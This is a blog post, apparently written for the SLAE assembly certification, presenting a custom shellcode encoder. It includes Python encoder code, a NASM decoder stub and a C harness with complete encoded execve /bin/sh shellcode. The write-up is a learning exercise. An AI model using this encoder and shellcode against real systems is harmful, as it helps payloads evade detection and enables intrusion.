<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4: Shellcode Encoding Scheme</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-120451103-1');
</script>
</head>
<body>
<div class='page'><strong>Encoding</strong> is the conversion of information into a particular form. We can encode shellcode, yet still execute it, by performing an operation on it then writing a small shellcode wrapper that reverses the operation and executes the decoded instructions.<br /><br />In the SLAE course, assignment four is to author a shellcode encoder in any language, as well as a decoder in assembly. Students are then to encode an instructor-provided shellcode, put it in the decoder program, and execute the decoder shellcode in a testing harness to verify that the encoding and decoding process works.<br /><br />I wanted to do something a little different for this assignment, so I made a pretty silly encoder. XOR, NOT, ROT13, etc. encoders are common and many were even demonstrated, with source code, in the SLAE course, so I did not want to write such an encoder. Instead I wrote a nonsensical encoder that first subtracts a selected value from each source byte, then performs a different mathematical operation on the byte depending on whether the resultant byte is even or odd. The mathematical operation flips the even-odd quality of the byte.<br /><br />The decoder interprets whether each byte of the encoded shellcode is even or odd and reverses the operation appropriately. I shorthand this SUB-EVEN-ODD encoding.<br /><br />The Python code is self-explanatory. Note that you could swap the constants in the algorithm with other constants and the algorithm would still work as long as the even-odd qualities are maintained. Also note that these values were selected to work with the provided shellcode. The algorithm contains subtraction, so to use it appropriately you would want to make sure the shellcode and constants are such that the encoded shellcode will not have null characters or negative numbers.<br /><br />The shellcode being encoded here launches a shell by calling <strong>execve</strong> and executing /bin/sh.<br /><br /><code>#!/usr/bin/python<br /><br />shellcode = (&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;)<br /><br />encoded = &quot;&quot;<br />encoded2 = &quot;&quot;<br /><br />print &#39;Encoded shellcode ...&#39;<br /><br />for x in bytearray(shellcode) :<br />	y = x - 4<br />	if (y % 2 == 0):<br />		y = y + 3<br />	else:<br />		y = y - 1<br /><br />	encoded += &#39;\\x&#39;<br />	encoded += &#39;%02x&#39; % y<br /><br />	encoded2 += &#39;0x&#39;<br />	encoded2 += &#39;%02x,&#39; % y<br /><br />print encoded<br />print encoded2<br /><br />print &#39;Len: %d&#39; % len(bytearray(shellcode))</code><br /><br /><a href=""><img src="images/15-1.png" alt="images/15-1.png" /></a><br /><br />I then loaded this shell into a decoder. It is based on a decoder used during the course, although the decoding operation itself is different. The decoder is fairly simply; it uses JMP-CALL-POP to load a pointer to the encoded shellcode into ESI, then iterates 25 times, performing a decode operation on as many bytes of shellcode before eventually passing control to the decoded shellcode. There are comments explaining the decoding operation. Reading the Python code should also provide an easy understanding of what is required to decode the shellcode.<br /><br />Of particular importance if one were to modify this shellcode is the hard-coded length of the shellcode and the string of encoded shellcode itself. Both are bolded in the code below.<br /><br /><code>; Filename: sub-even-odd-encoder.nasm<br />; Author: lastlistener<br />; Purpose: Demonstrate the use of shellcode encoded with SUB-EVEN-ODD encoding<br /><br />global _start			<br /><br />section .text<br />_start:<br />	jmp short call_shellcode<br /><br />decoder:<br />	pop esi<br />	xor ecx, ecx<br />	</code><strong><code>mov cl, 25</code></strong><code><br /><br /><br />decode:<br />	test byte [esi],0x1		; odd if the lowest bit is set<br />	jnz was_odd<br />	add byte [esi],0x1		; else it was even, so add the constant chosen for evens<br />	jmp loop_end<br />was_odd:<br />	sub byte [esi],0x3		; subtract the constant chosen for odds<br />loop_end:<br />	add byte [esi],0x4		; always add this constant<br />	inc esi<br />	loop decode<br /><br />	jmp short EncodedShellcode<br /><br />call_shellcode:<br />	call decoder<br /><br />	</code><strong><code>EncodedShellcode</code></strong><code>: </code><strong><code>db</code></strong><code> </code><strong><code>0x2c,0xbf,0x4f,0x67,0x2a,0x2a,0x6e,0x67,0x67,0x2a,0x61,0x64,0x6d,0x84,0xde,0x4f,0x84,0xe1,0x4e,0x84,0xdc,0xaf,0x06,0xc8,0x7f</code></strong><br />	<br />The decoder file can then be assembled and linked, and its shellcode extracted. The shellcode is then placed into the C testing harness, compiled and executed. It does decodes the shellcode and produces a shell, as it should:<br /><br /><a href=""><img src="images/15-2.png" alt="images/15-2.png" /></a><br /><br />The source of the C harness with the shellcode is as follows:<br /><br /><code>#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />unsigned char code[] = \<br />&quot;\xeb\x1a\x5e\x31\xc9\xb1\x19\xf6\x06\x01\x75\x05\x80\x06\x01\xeb\x03\x80\x2e\x03\x80\x06\x04\x46\xe2\xed\xeb\x05\xe8\xe1\xff\xff\xff\x2c\xbf\x4f\x67\x2a\x2a\x6e\x67\x67\x2a\x61\x64\x6d\x84\xde\x4f\x84\xe1\x4e\x84\xdc\xaf\x06\xc8\x7f&quot;;<br /><br /><br />main()<br />{<br /><br />	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));<br /><br />	int (*ret)() = (int(*)())code;<br /><br />	ret();<br /><br />}</code><br /><br />So there you have it! A little shellcode encoder and decoder.<br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div>
</body>
</html>
